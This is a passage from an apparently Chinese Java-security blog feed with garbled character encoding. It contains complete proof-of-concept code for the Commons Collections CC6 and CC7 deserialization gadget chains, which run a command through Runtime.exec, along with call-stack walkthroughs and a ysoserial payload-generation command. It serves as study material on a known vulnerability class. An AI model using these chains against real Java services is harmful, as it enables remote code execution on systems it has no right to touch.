class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ChainedTransformerå®ä¾‹</span></span><br><span class="line">        <span class="comment">//å…ˆè®¾ç½®å‡çš„ Transformer æ•°ç»„ï¼Œé˜²æ­¢ç”Ÿæˆæ—¶æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//LazyMapå®ä¾‹</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">uselessMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(uselessMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//TiedMapEntry å®ä¾‹</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//é€šè¿‡åå°„è®¾ç½®çœŸçš„ ransformer æ•°ç»„</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> chainedTransformer.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="comment">//æ¸…ç©ºç”±äº hashMap.put å¯¹ LazyMap é€ æˆçš„å½±å“</span></span><br><span class="line">        lazyMap.clear();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æµ‹è¯•ååºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å¤§ä½“è°ƒç”¨æ ˆï¼š</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è¿™é‡Œæ˜¯ jdk 1.7 çš„ï¼Œä¸åŒç‰ˆæœ¬ HashMap readObject å¯èƒ½ç•¥æœ‰ä¸åŒ</span></span><br><span class="line">  -&gt;HashMap.readObject()</span><br><span class="line">      -&gt;HashMap.putForCreate()</span><br><span class="line">          -&gt;HashMap.hash()</span><br><span class="line">            -&gt;TiedMapEntry.hashCode()</span><br><span class="line">                    -&gt;TiedMapEntry.getValue()</span><br><span class="line">                    -&gt;LazyMap.get()</span><br><span class="line">                      -&gt;ChainedTransformer.transform()</span><br><span class="line">                          -&gt;ConstantTransformer.transform()</span><br><span class="line">                              -&gt;InvokerTransformer.transform()</span><br><span class="line">                                  -&gt;â€¦â€¦â€¦â€¦</span><br></pre></td></tr></table></figure></div><h3 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h3><p><strong>æµ‹è¯•ç¯å¢ƒ</strong>ï¼š3.1-3.2.1ï¼Œjdk1.7,1.8</p><p>è¿™é‡Œä»ç„¶æ˜¯æƒ³æ³•å­è§¦å‘LazyMap.get()ã€‚Hashtable çš„ readObject ä¸­. é‡åˆ° hash ç¢°æ’æ—¶, é€šè¿‡è°ƒç”¨ä¸€ä¸ªå¯¹è±¡çš„ equals æ–¹æ³•å¯¹æ¯”ä¸¤ä¸ªå¯¹è±¡åˆ¤æ–­æ˜¯çœŸçš„ hash ç¢°æ’. è¿™é‡Œçš„ equals æ–¹æ³•æ˜¯ AbstractMap çš„ equals æ–¹æ³•ã€‚</p><p>Hashtable ç±»çš„å…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Hashtable çš„ readObject æ–¹æ³•</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">         <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">       â€¦â€¦â€¦â€¦â€¦â€¦</span><br><span class="line">        <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//reconstitutionPutæ–¹æ³•</span></span><br><span class="line">            reconstitutionPut(newTable, key, value);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.table = newTable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//è·Ÿè¿› reconstitutionPut æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;K,V&gt;[] tab, K key, V value)</span></span><br><span class="line">        <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;K,V&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//æ³¨æ„è¿™é‡Œçš„ equals æ–¹æ³•</span></span><br><span class="line">            <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Creates the new entry.</span></span><br><span class="line">        Entry&lt;K,V&gt; e = tab[index];</span><br><span class="line">        tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>è·Ÿè¿›ä¸Šé¢çš„ equals æ–¹æ³•ï¼Œå‘ç°æœ€ç»ˆè°ƒç”¨äº† AbstractMap ç±»çš„ equals æ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032255270.png"                      alt="image-20230124185509605"                ><figcaption>image-20230124185509605</figcaption></figure></p><blockquote><p>å°±æ˜¯åœ¨è¿™é‡Œè§¦å‘äº† LazyMap.get()ã€‚</p></blockquote><p>å®Œæ•´ä»£ç </p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Apache_Common_Collections.cc_1_7;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections7</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IllegalAccessException, IOException, ClassNotFoundException, NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ChainedTransformerå®ä¾‹</span></span><br><span class="line">        <span class="comment">//å…ˆè®¾ç½®å‡çš„ Transformer æ•°ç»„ï¼Œé˜²æ­¢ç”Ÿæˆæ—¶æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//LazyMapå®ä¾‹</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1,chainedTransformer);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2,chainedTransformer);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//é€šè¿‡åå°„è®¾ç½®çœŸçš„ ransformer æ•°ç»„</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> chainedTransformer.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ä¸Šé¢çš„ hashtable.put ä¼šä½¿å¾— lazyMap2 å¢åŠ ä¸€ä¸ª yy=&gt;yyï¼Œæ‰€ä»¥è¿™é‡Œè¦ç§»é™¤</span></span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(hashtable);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æµ‹è¯•ååºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>è¿™é‡Œéœ€è¦é‡å¤2æ¬¡é‡å¤çš„æ·»åŠ åˆ°<code>Hashtable</code>çš„æ“ä½œ</p><p><code>Hashtable</code>çš„<code>reconstitutionPut</code>æ–¹æ³•æ˜¯è¢«éå†è°ƒç”¨çš„</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032255026.png"                      alt="image-20230124191526657"                ><figcaption>image-20230124191526657</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032256026.png"                      alt="image-20230124191546132"                ><figcaption>image-20230124191546132</figcaption></figure></p><p>ç¬¬ä¸€æ¬¡è°ƒç”¨çš„æ—¶å€™ï¼Œå¹¶ä¸ä¼šèµ°å…¥åˆ°<code>reconstitutionPut</code>æ–¹æ³•forå¾ªç¯é‡Œé¢ï¼Œå› ä¸º<code>tab[index]</code>çš„å†…å®¹æ˜¯ç©ºçš„ï¼Œåœ¨ä¸‹é¢ä¼šå¯¹<code>tab[index]</code>è¿›è¡Œèµ‹å€¼ã€‚åœ¨ç¬¬äºŒæ¬¡è°ƒç”¨<code>reconstitutionPut</code>æ—¶ï¼Œtabä¸­æ‰æœ‰å†…å®¹ï¼Œæˆ‘ä»¬æ‰æœ‰æœºä¼šè¿›å…¥åˆ°è¿™ä¸ªforå¾ªç¯ä¸­ï¼Œä»è€Œè°ƒç”¨<code>equals</code>æ–¹æ³•ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆè¦è°ƒç”¨ä¸¤æ¬¡putçš„åŸå› ã€‚</p></blockquote><p>å¤§ä½“è°ƒç”¨æ ˆï¼š</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è¿™é‡Œæ˜¯ jdk 1.7 çš„ï¼Œä¸åŒç‰ˆæœ¬ HashMap readObject å¯èƒ½ç•¥æœ‰ä¸åŒ</span></span><br><span class="line">  -&gt;Hashtable.readObject()</span><br><span class="line">      -&gt;Hashtable.reconstitutionPut()</span><br><span class="line">            -&gt;AbstractMapDecorator.equals</span><br><span class="line">                -&gt;AbstractMap.equals()</span><br><span class="line">                  -&gt;LazyMap.get.get()</span><br><span class="line">                    -&gt;ChainedTransformer.transform()</span><br><span class="line">                      -&gt;ConstantTransformer.transform()</span><br><span class="line">                        -&gt;InvokerTransformer.transform()</span><br><span class="line">                          -&gt;â€¦â€¦â€¦â€¦</span><br></pre></td></tr></table></figure></div><h3 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h3><p>åœ¨javaååºåˆ—åŒ–ä¸Šæœ‰ä¸€ä¸ªé‡Œç¨‹ç¢‘å¼çš„å·¥å…· <a class="link"   href="https://github.com/frohoff/ysoserial" >ysoserial <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>ååºåˆ—åŒ–ï¥æ´åœ¨å„ä¸ªè¯­è¨€é‡Œæœ¬ä¸æ˜¯ä¸€ä¸ªæ–°é²œçš„åè¯ï¼Œä½†2015ï¦Gabriel Lawrence (@gebl)å’ŒChrisFrohoff (@frohoff)åœ¨AppSecCaliä¸Šæå‡ºï¦ºåˆ©ç”¨Apache Commons Collectionsæ¥æ„é€ å‘½ä»¤æ‰§â¾çš„åˆ©ç”¨é“¾ï¼Œå¹¶åœ¨ï¦åº•å› ä¸ºå¯¹Weblogicã€JBossã€Jenkinsç­‰è‘—ååº”ç”¨çš„åˆ©ç”¨ï¼Œä¸€çŸ³æ¿€èµ·åƒå±‚æµªï¼Œå½»åº•æ‰“å¼€ï¦ºä¸€ç‰‡Javaå®‰å…¨çš„è“ï©…ã€‚</p><p>è€Œ<strong>ysoserial</strong>å°±æ˜¯ä¸¤ä½åŸä½œè€…åœ¨æ­¤è®®é¢˜ä¸­é‡Šå‡ºçš„ä¸€ä¸ªå·¥å…·ï¼Œå®ƒå¯ä»¥è®©ç”¨æˆ·æ ¹æ®è‡ªå·±é€‰æ‹©çš„åˆ©ç”¨é“¾ï¼Œç”Ÿæˆååºåˆ—åŒ–åˆ©ç”¨æ•°æ®ï¼Œé€šè¿‡å°†è¿™äº›æ•°æ®å‘é€ç»™ç›®æ ‡ï¼Œä»â½½è€Œæ‰§â¾ç”¨æˆ·é¢„å…ˆå®šä¹‰çš„å‘½ä»¤ã€‚ï§½ä¹ˆæ˜¯åˆ©ç”¨é“¾ï¼Ÿ</p><p>åˆ©ç”¨é“¾ä¹Ÿå«â€œgadget chainsâ€ï¼Œæˆ‘ä»¬é€šå¸¸ç§°ä¸ºgadgetã€‚å¦‚æœä½ å­¦è¿‡PHPååºåˆ—åŒ–ï¥æ´ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†gadgetï§¤è§£ä¸ºä¸€ç§æ–¹æ³•ï¼Œå®ƒè¿æ¥çš„æ˜¯ä»è§¦å‘ä½ç½®å¼€å§‹åˆ°æ‰§â¾å‘½ä»¤çš„ä½ç½®ç»“æŸï¼Œåœ¨PHPé‡Œå¯èƒ½æ˜¯ __desctruct åˆ° eval ï¼›å¦‚æœä½ æ²¡å­¦è¿‡å…¶ä»–è¯­è¨€çš„ååºåˆ—åŒ–ï¥æ´ï¼Œé‚£ä¹ˆgadgetå°±æ˜¯ä¸€ç§ç”ŸæˆPOCçš„æ–¹æ³•ç½¢ï¦ºã€‚</p><p>ysoserialçš„ä½¿ç”¨ä¹Ÿå¾ˆç®€å•ï¼Œè™½ç„¶æˆ‘ä»¬æš‚æ—¶å…ˆä¸ï§¤è§£ CommonsCollections ï¼Œä½†æ˜¯ç”¨ysoserialå¯ä»¥å¾ˆå®¹ï§ åœ°ç”Ÿæˆè¿™ä¸ªgadgetå¯¹åº”çš„POCï¼š</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 &quot;id&quot;</span><br></pre></td></tr></table></figure></div><p>å¦‚ä¸Šï¼Œysoserialå¤§éƒ¨åˆ†çš„gadgetçš„å‚æ•°å°±æ˜¯ä¸€æ¡å‘½ä»¤ï¼Œæ¯”å¦‚è¿™é‡Œæ˜¯ id ã€‚ç”Ÿæˆå¥½çš„POCå‘é€ç»™ç›®æ ‡ï¼Œå¦‚æœç›®æ ‡å­˜åœ¨ååºåˆ—åŒ–ï¥æ´ï¼Œå¹¶æ»¡â¾œè¶³è¿™ä¸ªgadgetå¯¹åº”çš„æ¡ä»¶ï¼Œåˆ™å‘½ä»¤ id å°†è¢«æ‰§â¾</p>]]></content>
      
      
      <categories>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaåå°„</title>
      <link href="/2022/08/23/Java%E5%8F%8D%E5%B0%84/"/>
      <url>/2022/08/23/Java%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVAåå°„"><a href="#JAVAåå°„" class="headerlink" title="JAVAåå°„"></a>JAVAåå°„</h1><h2 id="ç±»åŠ è½½å™¨"><a href="#ç±»åŠ è½½å™¨" class="headerlink" title="ç±»åŠ è½½å™¨"></a>ç±»åŠ è½½å™¨</h2><h3 id="ç±»åŠ è½½-x2F-ç±»åˆå§‹åŒ–"><a href="#ç±»åŠ è½½-x2F-ç±»åˆå§‹åŒ–" class="headerlink" title="ç±»åŠ è½½&#x2F;ç±»åˆå§‹åŒ–"></a>ç±»åŠ è½½&#x2F;ç±»åˆå§‹åŒ–</h3><p>ä¸‰ä¸ªæ­¥éª¤</p><ul><li><p>ç±»çš„åŠ è½½ï¼š å°†classæ–‡ä»¶è¯»å…¥å†…å­˜ï¼Œå¹¶ä¸ºä¹‹åˆ›å»ºä¸€ä¸ªjava.lang.Classå¯¹è±¡</p><blockquote><p>ä»»ä½•ç±»è¢«ä½¿ç”¨æ—¶ï¼Œç³»ç»Ÿéƒ½ä¼šä¸ºä¹‹å»ºç«‹ä¸€ä¸ªjava.lang.Classå¯¹è±¡</p><p><strong>ç³»ç»Ÿä¸­æ‰€æœ‰çš„ç±»éƒ½æ˜¯java.lang.Classçš„å®ä¾‹ã€‚</strong></p></blockquote></li><li><p>ç±»çš„è¿æ¥</p><ul><li>éªŒè¯é˜¶æ®µï¼šæ£€éªŒè¢«åŠ è½½ç±»æ˜¯å¦æœ‰æ­£ç¡®çš„å†…éƒ¨ç»“æ„ï¼Œå¹¶å’Œå…¶ä»–ç±»åè°ƒä¸€è‡´</li><li>å‡†å¤‡é˜¶æ®µï¼šè´Ÿè´£ä¸ºç±»çš„ç±»å˜é‡åˆ†é…å†…å­˜ï¼Œå¹¶è®¾ç½®é»˜è®¤åˆå§‹åŒ–å€¼</li><li>è§£æé˜¶æ®µï¼šå°†ç±»çš„äºŒè¿›åˆ¶æ•°æ®ä¸­çš„ç¬¦å·å¼•ç”¨æ›¿æ¢ä¸ºç›´æ¥å¼•ç”¨</li></ul></li><li><p>ç±»çš„åˆå§‹åŒ–ï¼šä¸»è¦æ˜¯å¯¹ç±»å˜é‡åˆå§‹åŒ–</p><ul><li>å‡å¦‚è¯¥ç±»è¿˜æ²¡è¢«åŠ è½½å’Œè¿æ¥ï¼Œåˆ™å…ˆåŠ 